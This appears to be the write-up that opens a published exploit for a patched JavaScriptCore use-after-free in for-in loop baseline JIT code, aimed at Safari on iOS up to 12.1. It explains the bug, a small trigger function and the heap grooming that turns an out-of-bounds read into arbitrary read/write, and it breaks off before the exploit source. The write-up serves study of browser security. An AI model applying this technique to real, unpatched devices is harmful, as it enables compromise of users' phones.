	Disclaimer: I did not discover the bug used in the exploit.

	This is an exploit for a JavaScriptCore (JSC) use after free bug
	in forin loop baseline jit fixed in
		https://github.com/WebKit/webkit/commit/011860e5cb6a702a987545580eb698efa34ace4e.
 
	The exploit targets Safari on iOS up to 12.1, it achieves arbitrary read/write within
	WebCore process.

	For detail on JavaScriptCore internals referred in this write up you 
	can consult a phrack article 

		http://www.phrack.org/papers/attacking_javascript_engines.html
 
	To better understand the issue we start with a bit of background on how forin is implemented.

	To facilitate forin implementation JSC has JSPropertyEnumerator (runtime/JSPropertyEnumerator.h)
	class. The class is a JSCell, which means, its lifetime is managed by the garbage collector. It's 
	main purpose is to speed up the loop by caching certain offsets associated with
	the structure of the object it loops through. One of the fields is the structureID which
	is used to verify that the enumerator is dealing with object of proper structure and all
	the offsets cached are valid. The verification is done, as we are going to see later,
	by directly comparing the cached structure id with the on present in the object it enumerates.

	As any cell in JSC which references other cells it needs to make sure the references are alive
	when being used. To do that there is a visitChildren method which is called by the
	garbage collector while it marks alive objects on the heap. As we can see JSPropertyEnumerator,
	prior the patch, was marking JSString objects from m_propertyNames, yet leaving the possibility
	of the structure referenced via m_cachedStructureID member being swept, since Structure objects
	are JSCell as well, resulting into a possible use after free of the Structure object referenced
	by m_cachedStructureID.

	Also the Structure object caches corresponding JSPropertyEnumerator
	object as well. When we first enter forin loop with a structure 
	a new JSPropertyEnumerator is created and stored as part of 
	the Structure object and is reused during further uses of the Structure 
	object as a part of the forin loops.

	Now lets try to understand how the test case from the sample utilizes the that bug. 
	Lets consider a simple function using a forin loop.

	function foo(o, t) {
	 for (let p in o) {
		return t[p];
	 }
	}

	The bug is triggered once the function is compiled into baseline jit.
	Baseline jit is essentially direct conversion  of bytecode into assembly. 
	Some byte codes are just calls to C++ runtime and some have custom 
	assembly to back them up (see jit/JITOpcodes.cpp for detail on those). 
	We will just go through the bytecode itself, and refer to assembly version
	when necessary. (You can use JavaScripCode command line interpreter
	to dump both bytecode and jit disassembly). We will only describe the
	part relevant to the bug and skip the rest.

	From the bytecode above lets highlight the most important parts of the
	function execution flow while enumerating an object with only inlined properties 
	and both arguments have same structure. For instance a call like this
		foo({a:1}, {a:2});

	1. Get (create) the enumerator for o. It will cache the structure id and
	number of the inlined properties.
 
	2. Start iterating from 0 to the maximum number of inlined properties,
	retrieved from the enumerator.

	3. Execute op_get_direct_pname to retrieve first inlined property of t via 
	index from enumerator, while checking that the index is within limits
	and the structure id of t is the same as in enumerator.

	4. Return the retrieved value.

	Let modify our function in the following way.

	function foo(o, t) {
	 for (let p in o) {
		evil_function();
		return t[p];
	 }
	}

	It will an extra step between 2 and 3 (2.1), namely calling function 
	evil_function, the rest remains the same.

	Lets assume o and t have different structures (meaning we should take
	the slow path in op_get_direct_pname). In evil_function we can mutate
	o so it changes the structure, trigger garbage collection
	so the structure gets freed (yet still referenced in enumerator), 
	mutate t till its structure reuses object o former structure id.
   
	After that in step 4 it is still going to use cached structure id 
	from enumerator and retrieve the inlined property directly via index
	(since t will have the same structure id and the check will pass).
	In the case, for instance, when original o had one inlined property 
	and the new t had none it is going to retrieve whatever placed after
	t butterfly and treat it as a JSValue.
   
	Now lets outline the rough plan on how to achieve arbitrary read/write
	using the out of bound read described above (we assume 64-bit platform).

	First we force the javascripe engine to produce base line git for foo.
	o is going to be an object with two inlined properties. t is an 
	array with no inlined properties. When allocated, o will look something
	like this.

   0        8      10        18
   | o cell | null | o prop1 | o prop2 |

	Before trying to access the second property during the enumeration
	we trigger evil_function. We allocate t in such a way that it is followed
	by another array t1. 

   0        8             10        18
   | t cell | t butterfly | t1 cell | t1 butterfly |

	so at t + 0x18 we are going to have t1's butterfly. The second inlined
	property would have been located at t + 0x18 as well. So when 
	op_get_direct_pname attempt to directly retrieve it, it's going to interpret
	t1 butterfly as a JSValue. 

	We craft t1 butterfly so its fake cell value corresponds to an unboxed array 
	and set its butterfly to an object. This way we end up with read/write on 
	arbitrary javascript object, which can quite easy can be converted to 
	arbitrary read/write.

	Following is the source code implementing the outlined strategy.
